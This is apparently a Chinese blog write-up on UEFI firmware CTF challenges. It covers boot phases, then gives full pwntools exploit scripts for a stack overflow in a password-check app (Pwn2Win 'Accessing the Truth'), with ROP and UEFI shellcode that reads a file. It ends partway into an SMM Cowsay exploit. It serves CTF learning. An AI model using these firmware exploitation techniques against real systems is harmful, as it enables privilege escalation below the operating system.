---
id: UEFI-pwn-0x00
aliases: 
tags:
  - UEFI
  - WriteUp
date: 2024-04-17
draft: false
title: UEFI PWN 总结
---
# 基础概念

~~尽管比赛中的 UEFI PWN 题目通常并不需要太多基础知识就能解题，但在博客中多记一些总是好的。~~

## 系统启动的典型步骤

1. 加电自检 - `BIOS/UEFI` 运行，进行硬件检测和初始化
   - BIOS（Basic Input/Output System）是固化在主板 ROM 芯片上的一组程序，在系统加电后首先运行，负责硬件自检和初始化，以及引导加载操作系统
   - UEFI（Unified Extensible Firmware Interface）是一种新的主板固件接口标准，用于替代传统的 BIOS。它提供了更多高级特性，如图形界面、更快启动速度等
2. 引导 - `BIOS/UEFI` 根据设置从硬盘/ U盘 等设备加载 Bootloader
   - Bootloader 是操作系统内核运行前的一小段引导程序，负责初始化硬件环境，加载内核映像到内存，为内核运行做准备。常见的 Bootloader 有 GRUB、U-Boot 等
3. Bootloader 初始化硬件，加载内核映像和 initramfs 到内存
   - `initramfs/initrd` 是一个包含必要启动文件和驱动的微型根文件系统，以 cpio 或其他格式存储，在内核启动初期使用
4. 内核解压并初始化，挂载 initramfs 作为临时根目录
5. 内核启动 init 进程，完成其他初始化并启动系统服务
6. init 切换到真正的根文件系统，启动用户空间的应用程序

简单来说就是：BIOS/UEFI 加载 Bootloader，Bootloader 再加载操作系统内核，内核启动再完成其它初始化。

---
## UEFI 安全启动流程

> [!quote] 
> UEFI 安全启动（Secure Boot）是 UEFI 规范的一个重要特性，旨在增强计算机启动过程的安全性。它通过确保计算机仅加载和执行未被篡改的、经过数字签名验证的操作系统加载程序和驱动程序，来保护计算机免受恶意软件（尤其是引导级恶意软件和根套件）的侵害。

下图展现了 UEFI PI（平台初始化）规范中的引导流程，其中包括：

1. **SEC**，Security Phase：
	- 前期验证，进行初步的硬件检测和初始化
	- 系统的硬件尚未完全初始化，只有 CPU 处于可用状态
	- 从实模式切换到保护模式，创建临时堆栈和数据区域以供后续阶段使用
	- 找到 PEI 加载程序并从 SPI 中开始运行

1. **PEI**，Pre-EFI Initialization：
	- 前期初始化，主要负责内存的初始化，以及为后续的 DXE 阶段准备必要的资源和服务，系统的内存控制器被配置并启动，此后操作系统和应用程序才能使用内存
	- 检测和初始化早期硬件组件，如内存控制器和某些必要的外围设备
	- 建立 PEI 阶段的服务表，为 DXE 阶段提供基础服务，比如 Flash 固件访问、内存服务等
	- 加载并执行一些早期的驱动程序，这些驱动程序负责初始化更多的硬件设备
	
3. **DXE**，Driver Execution Environment：
	- 负责加载和执行所有的 UEFI 驱动，对系统硬件进行进一步的初始化，UEFI 固件利用之前 PEI 阶段收集的信息，来配置系统的剩余硬件资源
	- 加载 UEFI 驱动程序，这些驱动程序是以 EFI 可执行格式存储在固件或其他存储设备上
		- 驱动信息来源于 PEI 模式提供的一系列的 HOB（Hand-Off Block）
		- 涉及到设置 SMM（System Management Mode）的运行时环境，SMM 是一种特殊的执行模式（ring -2），用于处理一些底层的系统管理任务，如电源管理
	- 通过 `EFI_BDS_ARCH_PROTOCOL` 调用 `entry->bds`，启动 BDS 阶段
		- 其中 UEFI 规范定义了一系列的协议（Protocol），这些协议是软件模块之间交互的接口，也是 DXE 和驱动之间的通信方式
	
> [!tip] 
> DXE 阶段负责加载和执行大量的 UEFI 驱动和服务，通常是 UEFI PWN 题的考点

4. **BDS**，Boot Device Selection：
	- 显示启动菜单，允许用户选择启动设备（如果有多个可启动设备或操作系统）
		- 但是在提权类型的 UEFI PWN 中通常会在 `BdsDXE` 过程用自定义驱动禁用启动菜单的显示，需要通过漏洞利用来篡改启动项增加 `rdinit=/bin/sh` 参数实现提权
	- 确定启动设备，加载操作系统的引导程序

5. **TSL**，Transient System Load：
	- 可选阶段，负责加载和执行瞬态系统，如 UEFI Shell 或预引导环境

6. **RT**，Runtime：
	- 提供运行时服务给操作系统，包括系统时间、唤醒事件和变量存储等
	- 在操作系统运行期间仍然可用，即使 UEFI 的其他部分不再活跃

![[static/uefi-image0.png]]

---
## 传参规则

应用程序二进制接口（ABI）规定的函数调用约定视平台和语言而定，这里对以下两种进行区分：

- [System V AMD64 ABI](https://refspecs.linuxbase.org/elf/x86_64-abi-0.99.pdf)，即常见于 `x86_64` linux 下的函数调用约定：
	- 前 6 个整数或指针参数依次通过寄存器 **RDI, RSI, RDX, RCX, R8, R9** 传递
	- **对于系统调用会将第四个参数 RCX 改为 R10**
	- 前 8 个浮点参数通过 XMM0 - XMM7 传递
	- 超过 6 个整数参数或 8 个浮点参数的部分通过栈传递
	- 返回值通过 RAX 传递，浮点返回值通过 XMM0 传递
- [Microsoft x64](https://learn.microsoft.com/zh-cn/cpp/build/x64-calling-convention?view=msvc-170)，即 Windows 平台的函数调用约定：
	- 前 4 个整数或指针参数依次通过 **RCX, RDX, R8, R9** 传递
	- 前 4 个浮点参数通过 XMM0 - XMM3 传递
	- 其余参数通过栈传递
	- 返回值通过 RAX 传递

> [!tip] 
> 我曾在面试时将 **调用约定** 与 **应用二进制接口（ABI）标准** 混淆，虽然它们都涉及到函数调用的细节，但它们的适用范围和目的存在差异：
> - 调用约定包括 cdecl（C Declaration，规定调用者清理堆栈，允许函数有可变数量的参数）、stdcall（主要用于 Windows API，规定被调用函数清理堆栈，这意味着函数参数的数量是固定的）、fastcall（一种优化的调用约定，通过将前几个参数放在寄存器中传递，以减少堆栈操作，提高函数调用的效率，不同的编译器和平台可能对哪些寄存器应该被用来传递参数有不同的规定）等。
> - 应用程序二进制接口（ABI）详细规定了许多方面，包括但不限于函数调用约定、数据类型的大小和对齐、系统调用的编号和接口、对象文件格式，是包含函数调用约定在内的更广泛的标准集合。

逆向 UEFI 相关模块时可以发现其文件格式为 PE，因此利用时也应该编写 Microsoft x64 标准的 shellcode。

---
# 例题 1：Accessing the Truth

- 题目链接：[Too-Old-Challenges/Accessing_the_Truth.tar.gz](https://drive.google.com/drive/folders/1ClwAHcOvBmwJ3f6H1SBuOP6G7WRTVjND?usp=sharing)

## Analysis

UEFI pwn 通常需要研究基于 `EDK II` 编译生成的固件镜像文件 `OVMF.fd`，可用于在 QEMU 等虚拟机中提供 UEFI 支持，可以借助现有工具 `uefi-firmware-parser` 来进行初步解包：

```bash
# -e 解包，-c 打印信息，-O 保存到当前目录 ${FILENAME}_output/ 下
uefi-firmware-parser -ecO ./OVMF.fd
```

通常基于 edk2 的固件镜像会提供 UI 和 EFI Shell 两种交互方式，在其中可以进行 boot 参数的设置。题目也提供了 `boot.nsh`，其中 `.nsh` 是 UEFI Shell 脚本文件的扩展名。这些脚本文件包含一系列 UEFI Shell 命令,可以用于自动执行各种任务,如加载驱动程序、配置设备、启动操作系统等。UEFI 提权 pwn 的目标往往就是进入 UI 或者 EFI SHELL 的交互界面，修改 boot 启动参数为 `console=ttyS0 -initrd=initramfs.cpio rdinit=/bin/sh` 就可以绕开 init 脚本以 root 身份进入系统并获得 flag。

在进行逆向分析之前，还要明确分析的对象，故先运行启动脚本而后可以发现在启动过程中长按 `Esc (b"\x1b")` 或 `F12` 或 `F2` 都无法进入 Bios 界面，而是要求输入密码：

```bash
BdsDxe: loading Boot0000 "UiApp" from Fv(7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1)/FvFile(462CAA21-7614-4503-836E-8AB6F4662331)
BdsDxe: starting Boot0000 "UiApp" from Fv(7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1)/FvFile(462CAA21-7614-4503-836E-8AB6F4662331)
Setup Utility
Enter Password:
```

这里的 `BdsDxe` 是 UEFI 启动过程中的一个驱动程序，负责从固件卷（Firmware Volume）中加载启动项。即 UEFI 固件中自定义了一个名为「UiApp」的启动项，它覆盖了原本进入 BIOS 设置的启动项。所以按 ESC 键会加载运行这个「UiApp」程序，而不是进入正常的 BIOS 设置界面。

对刚接触 UEFI 的攻击者而言，定位有漏洞的校验程序可能是一个阻碍，这里有一种比较暴力的做法，即直接根据字符串定位：

```bash
# nix-shell -p ugrep
ug --encoding=UTF-16LE "Enter Password"
```

因为 UEFI 中的字符串编码方式有可能是 UTF-16 小端序，故采用上述命令在解包出来的目录下搜索找到：

```bash
Binary file volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0/section3/volume-ee4e5898-3914-4259-9d6e-dc7bd79403cf/file-462caa21-7614-4503-836e-8ab6f4662331/section0.pe matches
```

> [!tip]
> 这里介绍一个 UEFI 固件逆向插件：[efiXplorer](https://github.com/binarly-io/efiXplorer)，支持下列功能：
>
> - 定位和重命名已知的 UEFI GUID
> - 定位和重命名 SMI 处理程序
> - 定位和重命名 UEFI 启动/运行时服务

接下来就可以进入 ida 分析了。可以继续搜字符串找到主要逻辑函数（其实就在开头，ida 处理 UTF-16LE 麻烦的话可以直接到 xxd | nvim 里面用正则找），进行分析就可以发现函数中喜闻乐见的栈溢出了：

输入 `\n` 可以绕开长度检查而让指针增加，同时当前长度会被 `\x00` 截断：

```c
    my_puts(L"Enter Password: \n");
    while ( 1 )
    {
      v8 = my_getchar();
      ++v15;
      if ( v8 == '\r' )
        break;
      if ( v8 != '\n' )
      {
        v9[v15] = v8;
        my_puts(L"*");
        v5 = str_leng(v9);
        if ( v5 >= v13 - 1 )
          break;
      }
    }
    my_puts(L"\n");
    sub_A68(v9, v15, v11);
    if ( !sub_9AC(v11, &unk_1B840, v13) )
      return 1;
    my_puts(L"Wrong!!\n");
    ++v14;
```

## Exploitation

来到利用部分，为了方便调试可以先根据 `run.py` 改一个 pwn 脚本出来，若涉及 UEFI UI 的操作可以用 `socat -,raw,echo=0 SYSTEM:"./exp.py"` 运行：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

# from lianpwn import *
from pwn import *
import subprocess

context.arch = "amd64"
context.log_level = "debug"

rl = lambda a=False: io.recvline(a)
ru = lambda a, b=True: io.recvuntil(a, b)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
lg = lambda s_name, s_val: print("\033[1;31;40m %s --> 0x%x \033[0m" % (s_name, s_val))
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))

fname = "/tmp/uefipwn"
subprocess.call(["cp", "OVMF.fd", fname])
subprocess.call(["chmod", "u+w", fname])
io = process(
    [
        "qemu-system-x86_64",
        "-m",
        "64M",
        "-drive",
        "if=pflash,format=raw,file=" + fname,
        "-drive",
        "file=fat:rw:contents,format=raw",
        "-net",
        "none",
        "-nographic",
        "-s",
    ],
    env={},
)


def enterUiApp():
    rn(1)
    s(b"\x1b")
    s(b"\x1b")
    s(b"\x1b")
    s(b"\x1b")


enterUiApp()

ia()
```

到了这一步，这道题已经解决大半，接下来就回到了我们最熟悉的 ROP 环节，但是应该把控制流劫持到什么地方呢？毕竟这里没有机会去 `system("/bin/sh")` 了。

### Ret2Boot-Manager

不妨考虑这个 UiApp，它是一个密码校验程序，那假如密码正确会发生什么呢？没错，就是回到 bios 的 ui 界面中！我们的目标就是回去修改 boot 启动参数加上 `rdinit=/bin/sh` 绕开 init 脚本实现提权。

所以回到 `ModuleEntryPoint` 函数，发现如下分支判断：

```c
if ( (unsigned __int8)enterPassword() )
  {
    if ( !byte_1BA40 )
    {
      if ( (*(__int64 (__fastcall **)(_QWORD, void *, __int64 *))(qword_1BB58 + 152))(
             *(_QWORD *)(qword_1BB50 + 56),
             &unk_1B880,
             &v171) < 0 )
        v171 = 0i64;
      if ( (*(__int64 (__fastcall **)(_QWORD, void *, unsigned __int64 *))(qword_1BB58 + 152))(
             *(_QWORD *)(qword_1BB50 + 56),
             &unk_1B870,
             &v172) < 0 )
        v172 = 0i64;
      if ( v171 )
```

故直接把控制流劫持到 if 里面即可：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   socat -,raw,echo=0 SYSTEM:"./exp.py"
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

# from lianpwn import *
from pwn import *
import subprocess

context.arch = "amd64"

rl = lambda a=False: io.recvline(a)
ru = lambda a, b=True: io.recvuntil(a, b)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
lg = lambda s_name, s_val: print("\033[1;31;40m %s --> 0x%x \033[0m" % (s_name, s_val))
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))

fname = "/tmp/uefipwn"
subprocess.call(["cp", "OVMF.fd", fname])
subprocess.call(["chmod", "u+w", fname])
io = process(
    [
        "qemu-system-x86_64",
        "-m",
        "64M",
        "-drive",
        "if=pflash,format=raw,file=" + fname,
        "-drive",
        "file=fat:rw:contents,format=raw",
        "-net",
        "none",
        "-nographic",
        "-s",
    ],
    env={},
)


def enterUiApp():
    context.log_level = "debug"
    rn(1)
    s(b"\x1b")
    s(b"\x1b")
    s(b"\x1b")
    s(b"\x1b")
    context.log_level = "info"


enterUiApp()

ru(b"Enter Password: \r\n")
# input("debug")
s(b"\n" * 0x70 + p64(0x101) + b"\r")

ru(b"Enter Password: \r\n")
payload = flat(
    {
        0xC0 - 0x18: [
            0x28B0DD5,
        ],
    },
    filler=b"\n",
)
payload += b"\r"
s(payload)

ia()
```

![UEFI-success1](static/uefi-success1.png)

最后在 `Boot Maintenance Manager`.`Boot Options`.`Add Boot Option`.`bzImage` 下新增自定义的启动参数条目（直接照抄 boot.nsh）：`console=ttyS0 -initrd=initramfs.cpio rdinit=/bin/sh` 即可实现提权利用。

### UEFI Shellcode

其实在本题栈溢出的情况下，接下来的利用就是开放性的做法了，上面只是提供了一种最简单的提权办法：Ret2Boot-Manager（我自己起的名😋）借助已有的 ui 接口篡改启动选项。我在学习这道题的时候还看到了 `Bootloader Shellcode` 的做法，写入 shellcode 之所以可行是因为在 UEFI 阶段：

- 大部分内存默认是可执行的
- UEFI 规范并未强制要求加入栈保护（canary），这取决于编译器的支持
- ASLR 需要操作系统的支持，但是 UEFI 运行于操作系统之前，故 UEFI pwn 中不太需要考虑内存随机化

特别对于本题而言，直接把 shellcode 溢出写到栈上再用已知栈地址去调用可以实现 bootloader shellcode 的攻击了。

UEFI Shellcode 的实现思路通常围绕 UEFI 提供的 BootServices 来实现读取文件、写入文件等操作。其中 UEFI Boot Services 提供了一系列的函数，用于在UEFI环境中执行各种操作，如内存管理、设备控制、文件操作等。这些服务只在操作系统启动之前可用，启动后由操作系统接管这些功能。

下面的 Shellcode 来源于 [Pwn2Win CTF 2021 Writeup](https://ptr-yudai.hatenablog.com/entry/2021/05/31/232507#Pwn-373pts-Accessing-the-Trush-8-solves)，实现如下功能：

```c
SystemTable->BootService->LocateProtocol(
	&gEfiSimpleFileSystemProtocolGuid,
	NULL,
	&foo);
foo->OpenVolume(foo, &bar);
bar->Open(bar, &file, "/path/to/flag", EFI_FILE_MODE_READ, EFI_FILE_READ_ONLY);
file->Read(file, &size, buf);
print(flag);
```

```python
#!/usr/bin/env python3

# from lianpwn import *
from pwn import *
from subprocess import Popen, PIPE

context.arch = "amd64"

rl = lambda a=False: io.recvline(a)
ru = lambda a, b=True: io.recvuntil(a, b)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
lg = lambda s_name, s_val: print("\033[1;31;40m %s --> 0x%x \033[0m" % (s_name, s_val))
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))

base = 0x0000000028A7000
addr_SystemTable = base + 0x1BB50
addr_SimpleFile = base + 0x110
addr_ProtocolGuid = 0x28C2760
addr_Root = base + 0x210
addr_File = base + 0x290
addr_Path = base + 0x310
addr_Buf = 0x3E01010
addr_print = base + 0x1EE6
shellcode = """
// rbp = SystemTable->BootService
mov rax, [{pSystemTable}]
mov rbp, [rax + 0x60]
// LocateProtocol(...);
mov r8d, {pSimpleFile}
mov ecx, {pProtocolGuid}
xor edx, edx
xor eax, eax
mov ax, 0x140
add rax, rbp
call [rax]
// SimpleFile->OpenVolume(SimpleFile, &Root)
mov rbp, [r8]
mov rax, [rbp+8]
mov edx, {pRoot}
mov rcx, rbp
call rax
// Root->Open(Root, &File, "path", EFI_FILE_MODE_READ ,EFI_FILE_READ_ONLY);
mov r8d, {pRoot}
mov rbp, [r8]
xor r9d, r9d
mov r10d, r9d
inc r9d
mov edx, {pFile}
mov [rdx], r10
inc r10d
mov rcx, rbp
mov r8d, {pPath}
// L"flag.txt"
"""
path = b"initramfs.cpio\0"
utf16_path = b""
for c in path:
    utf16_path += bytes([c, 0])
for i in range(0, len(utf16_path), 8):
    b = utf16_path[i : i + 8]
    b += b"\0" * (8 - len(b))
    if i == 0:
        shellcode += """
        mov rbx, {}
        not rbx
        mov [r8], rbx
        """.format(hex(0xFFFFFFFFFFFFFFFF ^ u64(b)))
    else:
        shellcode += """
        mov rbx, {}
        not rbx
        mov [r8+{}], rbx
        """.format(hex(0xFFFFFFFFFFFFFFFF ^ u64(b)), i)
shellcode += """
mov rax, [rbp+8]
call rax
// file->Read(file, &size, buf)
mov r8d, {pFile}
mov rbp, [r8]
xor r8d, r8d
xor edx, edx
mov edx, 0x0101ffff
mov [rsp], rdx
mov rdx, rsp
mov rcx, rbp
mov rax, [rbp+0x20]
call rax
// find flag
mov rbx, 0x2d465443
xor edi, edi
lp:
mov eax, [rdi]
cmp rax, rbx
jz found
inc edi
jmp lp
found:
mov rcx, rdi
mov eax, {puts}
call rax
mov rcx, rdi
inc rcx
mov eax, {puts}
call rax
"""
shellcode = asm(
    shellcode.format(
        pSystemTable=addr_SystemTable,
        pSimpleFile=addr_SimpleFile,
        pProtocolGuid=addr_ProtocolGuid,
        pRoot=addr_Root,
        pFile=addr_File,
        pPath=addr_Path,
        pBuf=addr_Buf,
        puts=addr_print,
    )
)
print(shellcode)
assert b"\x00" not in shellcode


def enter_bootloader():
    sa(b"2J", b"\x1b\x5b\x32\x34\x7e" * 10)
    payload = b"\n" * (0x58 + 0x30)
    payload += p64(0xDEADBE00)  # rbx
    payload += p64(0xDEADBE01)  # r12
    payload += p64(0xDEADBE02)  # r13
    payload += p64(0xDEADBE03)  # rbp
    payload += p64(0x3EBC701)
    payload += b"\x90"
    payload += shellcode
    payload += b"\r"
    payload = payload.replace(b"\x00", b"\n")
    sa(b"Enter Password: \r\n", b"\r")
    sa(b"Enter Password: \r\n", b"\r")
    input("DEBUG")
    sa(b"Enter Password: \r\n", payload)


fname = tempfile.NamedTemporaryFile().name
os.system("cp OVMF.fd %s" % (fname))
os.system("chmod u+w %s" % (fname))
io = process(
    [
        "qemu-system-x86_64",
        "-monitor",
        "/dev/null",
        "-m",
        "64M",
        "-drive",
        "if=pflash,format=raw,file=" + fname,
        "-drive",
        "file=fat:rw:contents,format=raw",
        "-net",
        "none",
        "-nographic",
        "-s",
    ],
    env={},
)

enter_bootloader()
flag1 = b"CFB"
ru(flag1)
flag1 += ru(b"}")
flag2 = ru(b"\n").replace(b"\r", b"")
flag = ""
for i in range(len(flag2)):
    flag += chr(flag1[i]) + chr(flag2[i])
flag += "}"

__import__("lianpwn").success(flag)
```

---
# 例题 2：SMM Cowsay

先简单看一下 SMM 是什么：

> [!quote] 
> SMM（系统管理模式）是Intel处理器的一个特殊模式，主要用于实现底层硬件控制功能，如电源管理和系统硬件控制。这种模式的特点和操作流程如下：
> 
> 1. **定义和用途**：
>    - SMM是一种隔离的执行环境，专门用于处理系统范围内的关键功能，例如电源管理和硬件控制。
>    - 它通常包含OEM专有的设计代码，用于执行特定于制造商的任务。
> 
> 2. **如何进入SMM**：
>    - 通过系统管理中断（SMI）进入SMM。SMI可以通过硬件的SMI#引脚或通过高级可编程中断控制器（APIC）来触发。
>    - SMI是一种不可屏蔽的中断，这意味着它可以在大多数其他类型的中断被屏蔽时执行。
> 
> 3. **SMM环境**：
>    - ~~进入SMM后，处理器环境会转换到实模式，关闭分页（CR0寄存器的PE和PG位被设置为0），这允许直接访问最多4GB的物理内存。~~ 在较新的Intel处理器中，SMM可以支持64位模式和分页。这使得SMM能够更有效地管理和隔离更大的内存空间，并支持现代操作系统的需求。
>    - 在此模式下，常规中断被屏蔽，以避免干扰。
> 
> 4. **SMRAM（系统管理随机存取存储器）**：
>    - SMRAM是一种特殊的存储区域，用于在SMM期间存储代码和数据。它位于CPU和主板芯片组之间，仅在SMM激活时可访问。
>    - SMRAM的安全性至关重要，因为其访问控制不当可能导致安全漏洞，例如允许恶意软件访问或修改敏感信息。
> 
> 5. **退出SMM**：
>    - 使用RSM（resume）指令从SMM返回到正常执行状态。RSM指令是唯一的退出SMM的方式。
> 
> 6. **安全问题**：
>    - SMM是不可重入的，这意味着在当前SMM会话完成前，不会再次响应SMI。
>    - SMM的安全问题包括SMM调出漏洞，其中SMM代码可能调用位于SMRAM边界之外的函数，以及低址SMRAM损坏问题，这可能导致SMRAM中的数据在不应该的情况下被修改。

这是一道来自 [UIUCTF](https://uiuc.tf/) 2022 年 System 分类下的题目，作者是 YiFei Zhu，感觉他的题目质量都非常高：
- 题目链接：[2022.uiuc.tf](https://2022.uiuc.tf/challenges#SMM%20Cowsay%201-191)
- 非官方题解：
    - [Tower of Hanoi](https://toh.necst.it/uiuctf/pwn/system/x86/rop/UIUCTF-2022-SMM-Cowsay/)
    - [Fabio Pagani](https://pagabuc.me/blog/smm-cowsay-1-and-2-uiuctf-2022)

> [!note] 
> 我加入了赛事 Discord 但是没有找到完整的官方题解，有点好奇第三问的标准解法是怎样的。我的解法需要借助题目提供的报错时寄存器 dump 或者侧信道逐字节爆破 flag（时间或者报错都可以）。
## SMM Cowsay 1

题目附件解压出来可以得到：

```bash
❯ tree --level 1
.
├── chal_build # 题目构建目录，包含对 edk2 和 qemu 的 patch
├── edk2_artifacts # 包含 .efi 及其调试信息，可以用来定位函数或者找 ROP
├── edk2debug.log # 在启动过程中通过 IO 端口 0x402 观察到的 EDK2 调试日志，主要关注驱动模块的加载地址，可以用 qemu 参数 `-global isa-debugcon.iobase=0x402 -debugcon file:debug.log` 来重新生成当前的调试日志
├── README # 目录文件说明
└── run # 包含了做题所需的二进制文件
```

由于这道题提供了 patch 文件和所有 efi 相关的调试和执行文件，就省去了「[[#Analysis|解包 OVMF.fd 并根据 UTF-16LE 字符串定位目标驱动]]」的步骤，可以直接阅读 patch 分析题目漏洞与利用思路（甚至每个文件最前面都有出题人的注释，非常友善）：
### Analysis

`/chal_build/patches` 目录下分为 edk2 和 qemu 两部分，其中与解题相关的关键代码位于：

- **`0003-SmmCowsay-Vulnerable-Cowsay.patch`**：实现 SMM 模式下的 Cowsay 功能；
- **`0004-Add-UEFI-Binexec.patch`**：实现 binexec 功能，其中演示了如何使用 `mSmmCommunication->Communicate` 触发 `SmmCowsay`；

接下来可以关注 `SmmCowsayHandler` 在 SMM 下的具体实现：

```c
EFI_STATUS
EFIAPI
SmmCowsayHandler (
  IN EFI_HANDLE  DispatchHandle,
  IN CONST VOID  *Context         OPTIONAL,
  IN OUT VOID    *CommBuffer      OPTIONAL,
  IN OUT UINTN   *CommBufferSize  OPTIONAL
  )
{
  DEBUG ((DEBUG_INFO, "SmmCowsay SmmCowsayHandler Enter\n"));

  if (!CommBuffer || !CommBufferSize || *CommBufferSize < sizeof(CHAR16 *))
    return EFI_SUCCESS;

  Cowsay(*(CONST CHAR16 **)CommBuffer);

  DEBUG ((DEBUG_INFO, "SmmCowsay SmmCowsayHandler Exit\n"));

  return EFI_SUCCESS;
}
```

在上面 `SmmCowsayHandler` 或者 `Cowsay` 函数中都没有发现对 `CommBuffer` 的合法性校验，此外进入 `0005-PiSmmCpuDxeSmm-Open-up-all-the-page-table-access-res.patch` 中也发现出题人 patch 掉了所有分页相关的检查，相当于手动又禁用了 Paging：

> [!quote] 
> Because why not ;) A few years ago SMM didn't even have paging
> and nothing ever went wrong, right? I mean, what could possibly
> go wrong?

而 `CommBuffer` 又是如何传给 Smm 的？对于在 UEFI 的 SMM 中编写的驱动程序，通常需要通过 SMM 通信协议，即 `SmmCommunication` 与在操作系统环境下运行的组件进行数据交换。其中需要先定义通信数据结构、用 `LocateProtocol` 获取通信协议、用 `AllocatePool` 分配缓冲区、填充缓冲区、发送数据，具体可以参考 `0004-Add-UEFI-Binexec.patch` 中 `Cowsay` 函数的实现：

```c
// https://github.com/tianocore/edk2/blob/be92e09206c2e4bb388e7c9127f048689841dd01/UefiCpuPkg/PiSmmCommunication/PiSmmCommunicationPei.c#L58
//  +----------------------------------+<--
//  | EFI_SMM_COMMUNICATE_HEADER       |
//  |   HeaderGuid                     | <- DRAM
//  |   MessageLength                  |
//  +----------------------------------+

VOID
Cowsay (
  IN CONST CHAR16 *Message
  )
{
  EFI_SMM_COMMUNICATE_HEADER *Buffer;

  Buffer = AllocateRuntimeZeroPool(sizeof(*Buffer) + sizeof(CHAR16 *));
  if (!Buffer)
    return;

  Buffer->HeaderGuid = gEfiSmmCowsayCommunicationGuid;
  Buffer->MessageLength = sizeof(CHAR16 *);
  *(CONST CHAR16 **)&Buffer->Data = Message;

  mSmmCommunication->Communicate(
    mSmmCommunication,
    Buffer,
    NULL
  );

  FreePool(Buffer);
}
```

既然没有对输出内容指针的地址检查与限制，那解题思路就是把 `0x44440000` 作为 Message 指针拼到 `EFI_SMM_COMMUNICATE_HEADER` 的最后传给 `SmmCowsayHandler` 来让它输出 flag：
### Exploitation
#### STEP 0: Receive SystemTable and shellcode Address and Attach to Debugger

利用的第一步往往是写脚本把题目跑起来并且找到调试的办法，这道题中继续用 pwntools 加载 qemu，参数照抄 run.sh：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *
import lianpwn
import subprocess

context.log_level = "info"
context.arch = "amd64"
context.terminal = ["tmux", "sp", "-h", "-l", "120"]

rl = lambda a=False: io.recvline(a)
ru = lambda a, b=True: io.recvuntil(a, b)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))

LOCAL = 1
filename = "./qemu-system-x86_64 -no-reboot -machine q35,smm=on -cpu max -net none -serial stdio -display none -vga none -global ICH9-LPC.disable_s3=1 -global driver=cfi.pflash01,property=secure,value=on -drive if=pflash,format=raw,unit=0,file=OVMF_CODE.fd,readonly=on -drive if=pflash,format=raw,unit=1,file=OVMF_VARS_copy.fd -drive format=raw,file=fat:rw:rootfs -s".split()
if LOCAL:
    subprocess.run("cp OVMF_VARS.fd OVMF_VARS_copy.fd".split())
    io = process(filename)
else:
    remote_service = ""
    remote_service = remote_service.strip().split(":")
    io = remote(remote_service[0], int(remote_service[1]))

lianpwn.lg_inf(
    "STEP 0: Receive SystemTable and shellcode Address and Attach to Debugger"
)
ru(b"Address of SystemTable: 0x")
SystemTable_addr = int(rl(), 16)
ru(b"Address where I'm gonna run your code: 0x")
shellcode_addr = int(rl(), 16)
lianpwn.lg("SystemTable_addr", SystemTable_addr)
lianpwn.lg("shellcode_addr", shellcode_addr)
lianpwn.debugB()


def dump_register(reg_list):
    assert len(reg_list) == 15
    for i in range(15):
        lianpwn.info(f"reg[{i}] -> {hex(reg_list[i])}")


def execute_shellcode(shellcode, cowsay=False):
    result = []
    shellcode = shellcode.hex().encode()
    s(shellcode + b"\r\n" + b"done\r\n")
    ru(b"Running...\r\n")
    if cowsay:
        context.log_level = "debug"
        return
    for i in range(14):
        ru(b": 0x")
        result.append(int(ru(b"R", "drop"), 16))
    ru(b": 0x")
    result.append(int(ru(b"Done! Type more code\r\n", "drop"), 16))
    dump_register(result)
    return result


ia()
```

脚本中获得了题目提供的 SystemTable 地址和 Shellcode 地址，可以拿后者下断点进行调试：

```bash
#/usr/bin/env bash
# Usage: ./initgdb.sh 0x517d100

pwndbg -ex "target remote 127.0.0.1:1234" \
	-ex "b *($1)" \
	-ex "c"
```
#### STEP 1: AllocatePool and Setup Buffer

接下来继续完成利用前期准备工作：

> [!hint] 
> 在阅读 [toh 的 WP](https://toh.necst.it/uiuctf/pwn/system/x86/rop/UIUCTF-2022-SMM-Cowsay/) 时我看到了 [pahole](https://manpages.debian.org/unstable/dwarves/pahole.1.en.html)，可以展示 C 语言结构体内部偏移（不过需要提供带调试信息的二进制文件），感觉是一款很好的辅助工具：

1. 根据 SystemTable 找到 BootServices：
```c
❯ pahole -C EFI_SYSTEM_TABLE ./Binexec.debug
typedef struct {
        EFI_TABLE_HEADER   Hdr;                  /*     0    24 */
        CHAR16 *           FirmwareVendor;       /*    24     8 */
        UINT32             FirmwareRevision;     /*    32     4 */

        /* XXX 4 bytes hole, try to pack */

        EFI_HANDLE         ConsoleInHandle;      /*    40     8 */
